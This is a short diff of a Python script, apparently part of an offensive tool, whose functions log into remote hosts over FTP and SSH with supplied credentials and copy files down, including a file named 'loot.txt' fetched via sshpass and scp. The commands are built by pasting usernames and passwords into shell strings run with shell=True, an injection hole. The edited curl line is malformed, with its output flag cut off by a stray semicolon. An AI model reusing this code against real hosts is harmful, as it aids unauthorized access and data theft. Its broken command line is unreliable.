@@ -37,7 +37,7 @@ def get_ftp_files(ip, username, password):
 	ftp_cd = "cd ftp; "
 	mkdir = "mkdir " + username + "; "
 	cd = "cd " + username + "; "
-	wget = "wget -q -m ftp://" + username + ":" + password + "@" + ip + "; "
+	wget = "curl ftp://" + username + ":" + password + "@" + ip + "; -o retrieved_file;"
 	cmd = ftp_cd + mkdir + cd + wget
 	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
 	out, err = proc.communicate()
@@ -58,9 +58,7 @@ def get_mysql_files(ip, username, password):
 
 def get_ssh_files(ip, username, password, filename=None):
 	mkdir = "cd ssh; "#mkdir " + username + ":" + ip + ";"
-	# make dump file
-	# touch = "touch " + username + ":" + ip + "/dump.sql;"
-	
+
 	cmd = mkdir + "sshpass -p \"" + password + "\" scp " + username + "@" + ip + ":~/loot.txt ./loot.txt;"
 	proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
 	out, err = proc.communicate()
